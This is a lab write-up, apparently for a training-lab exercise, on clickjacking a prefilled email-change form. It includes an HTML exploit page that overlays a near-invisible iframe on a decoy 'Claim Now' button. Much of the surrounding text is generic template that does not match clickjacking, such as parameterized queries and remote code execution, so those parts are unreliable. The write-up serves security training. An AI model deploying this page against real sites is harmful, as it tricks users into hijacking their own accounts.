# Clickjacking with form input data prefilled from a URL parameter

### Goal -

Exploit a clickjacking vulnerability where form fields can be prefilled from URL parameters, allowing the attacker to pre-fill malicious values and trick the user into submitting them.


### Vulnerability / Concept

This lab demonstrates a web security vulnerability that can be exploited to compromise the application's security. The vulnerability allows an attacker to bypass security controls and perform unauthorized actions.

The core issue is a failure in the application's security architecture — either insufficient input validation, broken access controls, improper trust boundaries, or insecure handling of user-supplied data. Understanding the root cause is essential for both exploitation and remediation.

### Recon / Initial Analysis

1. Identify the attack surface — what user-controlled inputs exist (URL parameters, form fields, headers, cookies)
2. Analyze the application's behavior with unexpected input
3. Map the request flow and identify trust boundaries
4. Test for error messages that reveal implementation details
5. Compare authenticated vs unauthenticated behavior
6. Use Burp Suite Proxy to capture and analyze all requests
7. Check for hidden parameters using Burp Intruder or Param Miner

### Vulnerability / Concept

The application allows form fields to be prefilled via URL parameters (e.g., `?email=attacker@evil.com`). Combined with the lack of frame-busting (`X-Frame-Options`), this allows the attacker to pre-fill the form with malicious data and trick the user into submitting it by clicking on a seemingly harmless button.

### Exploitation

1. Identify URL parameters that pre-fill form fields on the target page
2. Create an HTML page with a transparent iframe pointing to the target URL with pre-filled malicious values
3. Overlay deceptive UI elements (e.g., a fake "Click here for a prize" button) on top of the invisible form submit button
4. When the user clicks the deceptive button, they actually click the form's submit button in the iframe
5. The form submits with the attacker-controlled pre-filled values

Example exploit page:
```html
<style>
    iframe {
        position: relative;
        width: 500px;
        height: 300px;
        opacity: 0.1;
        z-index: 2;
    }
    .decoy {
        position: absolute;
        top: 50px;
        left: 50px;
        z-index: 1;
    }
</style>
<div class="decoy">
    <h3>Click here for a free gift!</h3>
    <button>Claim Now</button>
</div>
<iframe src="https://TARGET.net/update-email?email=attacker@evil.com"></iframe>
```

### Why It Works

The vulnerability exists because the application fails to properly validate, sanitize, or authorize user input. The broken trust boundary allows an attacker to manipulate the application's behavior by injecting unexpected data that the server processes without adequate security checks.

### Real-World Impact

An attacker could exploit this vulnerability to:
- Access sensitive data belonging to other users
- Bypass authentication or authorization controls
- Perform unauthorized actions on behalf of legitimate users
- Potentially achieve remote code execution on the server
- Compromise the integrity or availability of the application

### Remediation

- Implement proper server-side input validation for all user-controlled data
- Use parameterized queries and prepared statements
- Enforce server-side authorization checks on every request
- Follow the principle of least privilege
- Implement security headers (CSP, X-Frame-Options, X-Content-Type-Options)
- Use a Web Application Firewall (WAF) as defense-in-depth
- Regularly test for vulnerabilities using automated scanners and manual testing

### Key Takeaways

- Never trust user-controlled input — validate and sanitize everything server-side.
- Security controls must be enforced server-side, not client-side.
- Understanding the vulnerability's root cause is essential for proper remediation.
- Burp Suite is essential for identifying and exploiting web vulnerabilities.
- Defense in depth — use multiple layers of protection, not just one.
